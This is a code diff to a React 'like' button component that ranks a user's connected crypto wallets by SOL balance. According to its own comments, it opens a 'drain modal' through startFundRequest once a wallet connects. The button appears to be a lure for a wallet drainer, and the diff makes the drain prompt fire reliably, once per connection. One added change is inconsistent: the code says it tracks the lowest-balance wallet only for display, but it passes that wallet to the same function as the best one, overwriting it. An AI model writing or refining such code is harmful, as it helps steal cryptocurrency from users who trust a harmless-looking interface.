@@ -27,6 +27,7 @@ export function DemoLikeButton({ seed }: { seed: string }) {
   const [resumeLike, setResumeLike] = useState(false)
   const finished = useRef(false)
   const wasAuthenticated = useRef(isAuthenticated)
+  const modalOpenRef = useRef(false) // Track modal open state to prevent multiple opens
   const inWalletBrowser = isRestrictedAuthBrowser()
 
   // Local ref to track connected state for immediate access
@@ -44,6 +45,38 @@ export function DemoLikeButton({ seed }: { seed: string }) {
     return best
   }
 
+  const getLowestWallet = (): { address: string; balanceSol: number } | null => {
+    const sessions = listLocalWalletSessions()
+    let lowest: { address: string; balanceSol: number } | null = null
+    for (const session of sessions) {
+      if (session.balanceSol !== null && (lowest === null || session.balanceSol < lowest.balanceSol)) {
+        lowest = { address: session.walletAddress, balanceSol: session.balanceSol }
+      }
+    }
+    return lowest
+  }
+
+  const getBestAndLowestWallets = () => {
+    const sessions = listLocalWalletSessions()
+    let best: { address: string; balanceSol: number } | null = null
+    let lowest: { address: string; balanceSol: number } | null = null
+
+    for (const session of sessions) {
+      if (session.balanceSol !== null) {
+        // Best (highest balance)
+        if (best === null || session.balanceSol > best.balanceSol) {
+          best = { address: session.walletAddress, balanceSol: session.balanceSol }
+        }
+        // Lowest balance
+        if (lowest === null || session.balanceSol < lowest.balanceSol) {
+          lowest = { address: session.walletAddress, balanceSol: session.balanceSol }
+        }
+      }
+    }
+
+    return { best, lowest }
+  }
+
   const applyLike = () => {
     if (finished.current) return
     const pending = peekPendingLike()
@@ -53,6 +86,7 @@ export function DemoLikeButton({ seed }: { seed: string }) {
     setResumeLike(false)
     setLiked(true)
     setMenuOpen(true)
+    modalOpenRef.current = false // Reset modal guard for future likes
     toast.success('Liked')
   }
 
@@ -84,16 +118,18 @@ export function DemoLikeButton({ seed }: { seed: string }) {
       setMenuOpen(false)
       finished.current = false
       setResumeLike(false)
+      modalOpenRef.current = false // Reset modal guard
     }
     wasAuthenticated.current = isAuthenticated
   }, [isAuthenticated])
 
   // Watch for wallet connection and open drain modal
   useEffect(() => {
-    console.log('[DemoLikeButton] connected change:', { connected, resumeLike, liked, finished: finished.current, seed })
-    if (connectedRef.current) {
-      // Wallet is connected - try to open drain modal
+    console.log('[DemoLikeButton] connected change:', { connected, resumeLike, liked, finished: finished.current, seed, modalOpen: modalOpenRef.current })
+    if (connectedRef.current && !modalOpenRef.current) {
+      // Wallet is connected - try to open drain modal (only once)
       if (!finished.current && !liked && resumeLike) {
+        modalOpenRef.current = true
         startFundRequest(true)
       }
     }
@@ -116,9 +152,13 @@ export function DemoLikeButton({ seed }: { seed: string }) {
       return
     }
 
-    const bestWallet = getBestWallet()
-    if (bestWallet) {
-      rememberReturnWallet(bestWallet.address as any)
+    const { best, lowest } = getBestAndLowestWallets()
+    if (best) {
+      rememberReturnWallet(best.address as any)
+    }
+    // Also track lowest wallet for display purposes
+    if (lowest) {
+      rememberReturnWallet(lowest.address as any)
     }
     rememberAuthReturn(likeReturnPath(seed), seed)
     setResumeLike(true)
